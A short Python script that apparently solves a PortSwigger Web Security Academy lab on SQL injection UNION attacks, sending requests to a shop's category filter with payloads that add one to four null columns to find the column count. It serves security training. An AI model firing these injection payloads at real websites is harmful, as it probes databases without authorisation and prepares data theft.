"""
https://portswigger.net/web-security/sql-injection/union-attacks/lab-determine-number-of-columns
"""

import sys
import requests

site = sys.argv[1]
if 'https://' in site:
    site = site.rstrip('/').lstrip('https://')

def try_category(category_string):
    url = f'https://{site}/filter?category={category_string}'
    resp = s.get(url)
    print(resp.status_code)

s = requests.Session()

try_category("""Gifts' UNION SELECT null -- """)
try_category("""Gifts' UNION SELECT null,null -- """)
try_category("""Gifts' UNION SELECT null,null,null -- """)
try_category("""Gifts' UNION SELECT null,null,null,null -- """)